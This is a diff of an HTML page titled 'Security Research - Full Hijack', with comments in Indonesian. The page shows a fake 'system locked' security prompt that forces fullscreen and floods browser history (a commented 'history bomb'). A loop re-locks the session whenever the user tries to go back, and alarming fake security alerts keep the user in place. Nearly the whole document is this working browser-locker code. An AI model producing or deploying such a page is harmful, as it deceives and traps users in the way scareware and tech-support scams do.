@@ -3,71 +3,80 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Security Research - Redirect Hijacking</title>
+    <title>Security Research - Full Hijack</title>
     <style>
-        body { margin: 0; padding: 0; background: #000; overflow: hidden; height: 100vh; font-family: sans-serif; }
+        /* Memastikan tidak ada celah di pinggir layar */
+        html, body { 
+            margin: 0; padding: 0; width: 100%; height: 100%; 
+            overflow: hidden; background: #000; 
+        }
         
-        /* IFRAME UTAMA: Mengisi seluruh layar */
+        /* IFRAME: Paksa ukuran penuh 100vw dan 100vh */
         #evilHost {
-            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+            position: absolute; top: 0; left: 0;
+            width: 100vw; height: 100vh;
             border: none; display: none; z-index: 9999;
             background: white;
         }
 
         .start-page {
             display: flex; flex-direction: column; align-items: center;
-            justify-content: center; height: 100vh; color: white; text-align: center;
+            justify-content: center; height: 100vh; color: white;
         }
         .btn-start {
-            padding: 20px 40px; background: #d93025; color: white;
-            border: none; border-radius: 8px; font-weight: bold; cursor: pointer;
-            font-size: 1.1rem;
+            padding: 25px 50px; background: #d93025; color: white;
+            border: none; border-radius: 10px; font-weight: bold;
+            font-size: 1.2rem; box-shadow: 0 5px 15px rgba(217,48,37,0.4);
         }
     </style>
 </head>
 <body>
 
     <div class="start-page" id="gate">
-        <h1 style="color: #ff4d4d;">⚠ ACCESS RESTRICTED</h1>
-        <p>Security protocol required to unlock this content.</p>
-        <button class="btn-start" onclick="enterThePrison()">UNLOCK NOW</button>
+        <h1 style="color: #ff4d4d;">⚠ SYSTEM LOCKED</h1>
+        <p>Interaksi diperlukan untuk sinkronisasi keamanan.</p>
+        <button class="btn-start" onclick="enterThePrison()">SINKRONISASI SEKARANG</button>
     </div>
 
-    <iframe id="evilHost" src="https://www.wikipedia.org"></iframe> <script>
+    <iframe id="evilHost" src="https://www.wikipedia.org"></iframe>
+
+    <script>
         const iframe = document.getElementById('evilHost');
         const gate = document.getElementById('gate');
+        const el = document.documentElement;
 
         function enterThePrison() {
-            // 1. Tampilkan Iframe & Sembunyikan Gerbang
+            // 1. Tampilkan Iframe
             gate.style.display = "none";
             iframe.style.display = "block";
 
-            // 2. Fullscreen (Sembunyikan UI Browser)
-            const el = document.documentElement;
-            if (el.requestFullscreen) el.requestFullscreen();
-            else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
-
-            // 3. History Bomb (Kunci Tombol Back)
-            for (let i = 0; i < 80; i++) {
-                window.history.pushState({p: i}, "", "?session_locked=" + Math.random().toString(36).substring(7));
+            // 2. PAKSA FULLSCREEN
+            if (el.requestFullscreen) {
+                el.requestFullscreen().catch(err => {
+                    console.log("Gagal Fullscreen: " + err.message);
+                });
             }
 
-            alert("Security Tunnel Established. Navigation is now restricted for your protection.");
+            // 3. HISTORY BOMB (Kunci navigasi)
+            for (let i = 0; i < 100; i++) {
+                window.history.pushState({p: i}, "", "?session_id=" + Math.random().toString(36).substring(7));
+            }
+
+            alert("Sistem Berhasil Disinkronisasi. Navigasi dikunci demi keamanan.");
         }
 
-        // 4. THE ESCAPE BLOCKER (The Loop)
+        // 4. THE ESCAPE BLOCKER (The Re-Lock Loop)
         window.onpopstate = function() {
             if (navigator.vibrate) navigator.vibrate(200);
 
-            // Alert ini memberikan "User Activation" baru untuk re-lock Fullscreen
-            alert("⚠️ SECURITY VIOLATION:\nUnauthorized navigation attempt detected.\n\nClick OK to re-secure this session.");
+            // Munculkan Alert untuk mendapatkan 'User Gesture' baru
+            alert("⚠️ PERINGATAN KEAMANAN:\nUpaya keluar terdeteksi. Klik OK untuk mengunci kembali sesi.");
 
+            // Gunakan interaksi OK tadi untuk masuk Fullscreen lagi
             setTimeout(() => {
-                // Re-Lock Fullscreen
-                const el = document.documentElement;
                 if (el.requestFullscreen) el.requestFullscreen();
                 
-                // Tambah amunisi history lagi
+                // Tambah history lagi agar user makin jauh dari halaman asli
                 for (let i = 0; i < 10; i++) {
                     window.history.pushState(null, "", "?secure_relock=" + Date.now());
                 }
